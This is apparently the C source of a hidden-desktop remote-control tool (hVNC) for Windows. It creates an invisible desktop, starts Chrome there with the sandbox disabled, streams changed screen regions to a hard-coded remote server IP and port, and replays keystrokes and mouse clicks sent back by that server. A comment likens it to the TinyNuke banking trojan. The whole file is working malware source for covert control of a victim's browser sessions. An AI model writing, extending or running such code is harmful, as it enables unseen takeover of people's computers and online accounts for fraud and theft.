#define SERVER_IP "69.69.69.69"
#define SERVER_PORT "6968"

#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "jpeg.h"
#include "socks.h"
void run(char* desktop_name, char* path){
    STARTUPINFOA startup_info = {0};
    PROCESS_INFORMATION process_info = {0};
    startup_info.cb = sizeof(startup_info);
    startup_info.lpDesktop = desktop_name;
    CreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_info);
}
void start_explorer(char* desktop_name){
    STARTUPINFOA startup_info = {0};
    PROCESS_INFORMATION process_info = {0};
    startup_info.cb = sizeof(startup_info);
    startup_info.lpDesktop = desktop_name;
    CHAR explorer_path[MAX_PATH];
    ExpandEnvironmentStringsA("%windir%\\explorer.exe", explorer_path, MAX_PATH-1);
    CreateProcessA(explorer_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_info);
}
HDESK dsk;
int sendframe = 0;
int fullf = 0;
void inputthd(){
    SetThreadDesktop(dsk);
    HANDLE hwd = GetTopWindow(NULL);
    while(1){
        char* data = sock_recv();
        if(data==NULL) return;
        if(data[0]==0x69){
            //keypress
            int keycode = 0;
            memcpy(&keycode, data+1, 4);
            PostMessage(hwd, WM_KEYDOWN, keycode, 0 );
            printf("keypress %x\n", keycode);
        }else if(data[0]==0x71){
            //mouse click
            int x = 0;
            int y = 0;
            memcpy(&x, data+1, 4);
            memcpy(&y, data+5, 4);
            POINT point;
            point.x = x;
            point.y = y;
            hwd = WindowFromPoint(point);
            for (HWND currHwnd = hwd;;){
                hwd = currHwnd;
                ScreenToClient(hwd, &point);
                currHwnd = ChildWindowFromPoint(hwd, point);
                if (currHwnd == NULL || currHwnd == hwd)
                    break;
            }
            printf("click %d, %d\n", x, y);
            LPARAM lParam = MAKELPARAM(point.x, point.y);
            PostMessage(hwd, WM_LBUTTONDOWN, 0, lParam);
            Sleep(100);
            PostMessage(hwd, WM_LBUTTONUP, 0, lParam);
        }else if(data[0]==0x67){
            //full frame send, do not use incremental
            fullf = 1;
        }
        sendframe = 1;
        free(data);
    }
}
int main(){
    //change this name
    char* desktop_name = "haxxordesktop12345";
    dsk = OpenDesktopA(desktop_name, 0, FALSE, GENERIC_ALL);
    if(dsk==NULL) dsk = CreateDesktopA(desktop_name, NULL, NULL, 0, GENERIC_ALL, NULL);
    SetThreadDesktop(dsk);
    //uncomment to use explorer.exe as well
    //start_explorer();
    //launch chrome. making a new browser profile is left as exercise to reader
    run(desktop_name, "cmd.exe /c \"start /max chrome.exe --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11\"");
    Sleep(1000);
    sock_init();
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)inputthd, NULL, 0, NULL);
    HWND hDesk = GetDesktopWindow();
    RECT rect;
    GetWindowRect(hDesk, &rect);
    HDC hdc = GetDC(NULL);
    unsigned char* pastbm = calloc(10000000, 1);
    unsigned char* bitmap;
    //main loop
    while(1){
        while(!sendframe) Sleep(100);
        sendframe=0;
        HDC memdc = CreateCompatibleDC(hdc);
        HBITMAP hbitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
        SelectObject(memdc, hbitmap);
        //we set WS_EX_COMPOSITED temporarily, double buffering GREATLY increases cpu use for many programs (includes chrome)
        //so we only set for 50ms, to allow buffering to take place, then PrintWindow
        HWND curw = GetWindow(GetTopWindow(NULL), GW_HWNDLAST);
        HWND ocurw = curw;
        while(curw != NULL){
            if(IsWindowVisible(curw))
                SetWindowLongA(curw, GWL_EXSTYLE, GetWindowLongA(curw, GWL_EXSTYLE) | WS_EX_COMPOSITED);
	        curw = GetWindow(curw, GW_HWNDPREV);
        }
        Sleep(50);
        curw = ocurw;
        //double buffering shld be done, now we render all visible windows, unsetting composited
        while(curw != NULL){
            if(!IsWindowVisible(curw)) goto next;
            RECT wRect;
            GetWindowRect(curw, &wRect);
	        HDC wdc = CreateCompatibleDC(hdc);
	        HBITMAP wbitmap = CreateCompatibleBitmap(hdc, rect.right - rect.left, rect.bottom - rect.top);
	        SelectObject(wdc, wbitmap);
	        if (PrintWindow(curw, wdc, 0))
		        BitBlt(memdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, wdc, 0, 0, SRCCOPY);
            SetWindowLongA(curw, GWL_EXSTYLE, GetWindowLongA(curw, GWL_EXSTYLE) ^ WS_EX_COMPOSITED);
	        DeleteObject(wbitmap);
	        DeleteDC(wdc);
        next:
            curw = GetWindow(curw, GW_HWNDPREV);
        }
        bitmap = calloc(10000000, 1);
        DWORD cb = GetBitmapBits(hbitmap, 10000000, bitmap);
        int bpb = cb/(rect.right*rect.bottom);
        int top = 0;
        int topset = 0;
        int left = rect.right;
        int bot = 0;
        int right = 0;
        //fullframe send
        if(fullf){
            memset(pastbm, 0, 10000000);
            fullf = 0;
        }
        //otherwise we draw out a rectangle which contains all the changed pixels. we only transmit that instead of fullframe(which tinynuke does), greatly decrease latency
        //esp powerful for decrease typing latency, which is the most annoying one to work with
        for(int i=0;i<cb;i+=bpb){
            if(memcmp(pastbm+i, bitmap+i, bpb)!=0){
                int y = i/(bpb*rect.right);
                if(!topset){
                    top = y;
                    topset = 1;
                }
                int x = (i/bpb)%rect.right;
                if(x<left) left = x;
                if(x>right) right = x;
                if(y>bot) bot = y;
            }
        }
        if(left==rect.right) left=0;
        bot++;
        right++;
        if(bot>rect.bottom) bot = rect.bottom;
        if(right>rect.right) right = rect.right;
        free(pastbm);
        //bitblt the changed rect
        HDC hNew = CreateCompatibleDC(hdc);
        HBITMAP hBmp = CreateCompatibleBitmap(hdc, right - left, bot - top); 
        SelectObject(hNew, hBmp);
        BitBlt(hNew, 0, 0, right - left, bot - top, memdc, left, top, SRCCOPY);
        DeleteObject(hbitmap);
	    DeleteDC(memdc);
        pastbm = bitmap;
	    int sz = 0;
        //convert to png, ik it says jpg, just deal with it
	    char* jpg = bmptojpg(hBmp, &sz);
	    DeleteObject(hBmp);
	    DeleteDC(hNew);
	    if(sock_send(jpg, sz, left, top)) break;
    }
    free(bitmap);
    CloseDesktop(dsk);
}
